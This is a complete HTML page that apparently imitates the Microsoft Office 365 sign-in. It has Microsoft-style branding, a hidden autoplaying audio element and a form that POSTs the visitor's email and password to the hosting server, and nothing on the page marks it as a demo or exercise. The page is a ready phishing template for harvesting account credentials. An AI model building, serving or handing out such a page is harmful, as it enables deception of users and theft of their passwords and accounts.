<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login Office</title>
    <style>
        body {
            background-image: url("/static/background.jpg");
            background-size: cover;
            font-family: Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            color: white;
            flex-direction: column;
        }

        .login-box {
            background: rgba(0,0,0,0.6);
            padding: 30px;
            border-radius: 10px;
        }

        input {
            margin: 10px 0;
            padding: 10px;
            width: 250px;
            border: none;
            border-radius: 5px;
        }

        button {
            padding: 10px;
            width: 270px;
            background: #0078d4;
            border: none;
            color: white;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <audio autoplay hidden>
        <source src="/static/sound.mp3" type="audio/mpeg">
    </audio>

    <div class="login-box">
        <h2>Login Office 365</h2>
        <form method="POST">
            <input type="email" name="email" placeholder="Email" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
